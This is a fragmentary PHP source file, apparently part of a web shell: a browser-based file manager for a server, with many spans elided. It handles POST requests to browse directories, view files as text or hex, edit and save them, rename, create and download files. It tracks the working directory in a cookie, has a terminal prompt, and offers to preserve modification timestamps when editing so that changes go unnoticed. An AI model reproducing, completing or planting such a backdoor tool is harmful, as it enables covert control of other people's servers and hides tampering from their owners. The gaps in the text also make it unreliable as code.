...
if (!function_exists("cwd")) {
	function cwd() {
		...
		if (!isset($_COOKIE['cwd'])) {
			...
			$cwds = rawurldecode($_COOKIE['cwd']);
			if (is_dir($cwds)) {
				$cwd =  realpath($cwds) .DIRECTORY_SEPARATOR;
			} else {
				setcookie("cwd", $cwd);
			}
			return $cwd;
...
if(!function_exists('fixMagicQuote')){
	function fixMagicQuote($arr){
...
if (!function_exists("writeable")) {
	function writeable($filename, $perms) {
		return (is_writable($filename)) ? "<span color='green'>{$perms}</span>" : "<span color='red'>{$perms}</span>";
	}

}

if(!function_exists('formatBit')){
		...
		if (is_file($filename)) {
			...
			if ($type == "code") {
				...
				$content = "<center>
								...
								<p><span class='button' onclick=\"multimedia('".html_safe(addslashes($filename))."');\">Load Multimedia File</span></p>
							</center>";
			} elseif ($type == "edit") {
				...
				<table id='editTbl'>
					<tr>
						<td colspan='2'>
							<input type='text' id='editFilename' class='colSpan' value='".html_safe($filename)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\">
						</td>
					</tr>
					<tr>
						<td class='colFit'>
							<span class='button' onclick=\"edit_save_raw();\">save</span>
						</td>
						<td style='vertical-align:middle;'>
							<div class='cBox".$preservecBox."'></div>
							<span>preserve modification timestamp</span>
							<span id='editResult'></span>
						</td>
					</tr>
					<tr>
						<td colspan='2'>
							<textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($filename))."</textarea>
						</td>
					</tr>
				</table>";
			} elseif ($type == "hex") {
				$preservecBox = ($preserveTimestamp == "true") ? "cBoxSelected" : "";
				$content = "<table id='editTbl'>
								<tr>
									<td colspan='2'>
										<input type='text' id='editFilename' class='colSpan' value='".html_safe($filename)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\">
									</td>
								</tr>
								<tr>
									<td class='colFit'>
										<span class='button' onclick=\"edit_save_hex();\">save</span>
									</td>
									<td style='vertical-align:middle;'>
										<div class='cBox".$preservecBox."'></div>
										<span>preserve modification timestamp</span>
										<span id='editHexResult'></span>
									</td>
								</tr>
								<tr>
									<td colspan='2'>
										<textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($filename))."</textarea>
									</td>
								</tr>
							</table>";
			} else {
				$content = "<pre>".html_safe(read_file($filename))."</pre>";
			}

			$output .= "
			<table id='viewFile' class='boxtbl'>
				<tr>
					<td style='width:120px;'>Filename</td>
					<td>" .basename(html_safe($filename)). "</td>
				</tr>
			<tr>
				<td>Size</td>
				<td>" .getFileSize($filename). " (" .filesize($filename). ")</td>
			</tr>
			".$owner."
			<tr>
				<td>Permission</td>
				<td>" .writeable($filename, getFileperms($filename)). "</td>
			</tr>
			<tr>
				<td>Create time</td>
				<td>" .@date("d-M-Y H:i:s", filectime($filename)). "</td>
			</tr>
			<tr>
				<td>Last modified</td>
			...
			<tr>
				<td>Last accessed</td>
				<td>".@date("d-M-Y H:i:s",fileatime($filename))."</td>
			</tr>
			<tr data-path='".html_safe($filename)."'>
				<td colspan='2'>
					<span class='navigate button' style='width:120px;'>explorer</span>
					<span class='action button' style='width:120px;'>action</span>
					<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($filename))."', 'hex');hide_box();\">hex</span>
					<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($filename))."', 'multimedia');hide_box();\">multimedia</span>
				</td>
			</tr>
			<tr>
				<td colspan='2'>
					<div id='viewFilecontent'>".$content."</div>
				</td>
			</tr>
			</table>";
		} else {
...
if (!function_exists("showFiles")) {
	function showFiles($path)
	{
		...
		$output .= "<th class='col-action'>Action</th></tr></thead><tbody>";
...
chdir(cwd());
$nav = getNav(cwd());
$post = array_map("rawurldecode", getPost());
$cwd = html_safe(cwd());
...
if(isset($p['viewEntry'])){
	...
	if(is_file($path)){
		...
		$explorerContent = viewFile($path, "auto");
	}
	elseif(is_dir($path)){
		$path = realpath($path).DIRECTORY_SEPARATOR;
		setcookie("cwd", $path);
		...
		$nav = getNav($path);
		$cwd = html_safe($path);
		$explorerContent = showFiles($path);
	}
} else {
	$explorerContent = showFiles(cwd());
}
...
if(isset($post['cd'])){
	...
	if(is_dir($path)){
		...
		if(isset($post['showfiles'])&&($post['showfiles']=='true')){
			$res .= showFiles($path);
		}
	}
	else $res = "error";
...
elseif(isset($post['viewFile']) && isset($post['viewType'])){
	$path = trim($post['viewFile']);
	$type = trim($post['viewType']);
	$preserveTimestamp = trim($post['preserveTimestamp']);
	if(is_file($path)){
		$res = viewFile($path, $type, $preserveTimestamp);
	}
	else $res = "error";
	output($res);
}
elseif(isset($post['renameFile']) && isset($post['renameFileTo'])){
	$renameFile = trim($post['renameFile']);
	$renameFileTo = trim($post['renameFileTo']);
...
elseif(isset($post['newFolder'])){
	$newFolder = trim($post['newFolder']);
	if(mkdir($newFolder)){
...
elseif(isset($post['newFile'])){
	$newFile = trim($post['newFile']);
	if(touch($newFile)){
		$res = dirname($newFile);
	}
	else $res = "error";
...
elseif(isset($post['editType']) && isset($post['editFilename']) && isset($post['editInput']) && isset($post['preserveTimestamp'])){
	$editFilename = trim($post['editFilename']);
	$editInput = trim($post['editInput']);
	$editType = trim($post['editType']);
	$preserveTimestamp = trim($post['preserveTimestamp']);
...
elseif(isset($post['download'])){
	$file = trim($post['download']);
	if(is_file($file)){
...
elseif(isset($post['viewFileorFolder'])){
	$entry = $post['viewFileorFolder'];
	...
	<head>
		...
		<style type="text/css">
			...
			*{
			...
			#tobottom,
			#toggleBasicInfo { 
				background:url('<?php echo getResource('arrow');?>');
				width:32px;
				height:32px;
				opacity:0.30;
				margin:18px 0;
	...
	send_post({ cd:path, showfiles:showfiles }, function(res){
		if(res!='error'){
			...
			if(splits.length==3){
				...
				$('#terminalCwd').html(html_safe(cwd())+'&gt;');
				xpl_bind();
				window_resize();
			}
		}
...
function viewfileorfolder(){
	...
	content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
	show_box(title, content);
}
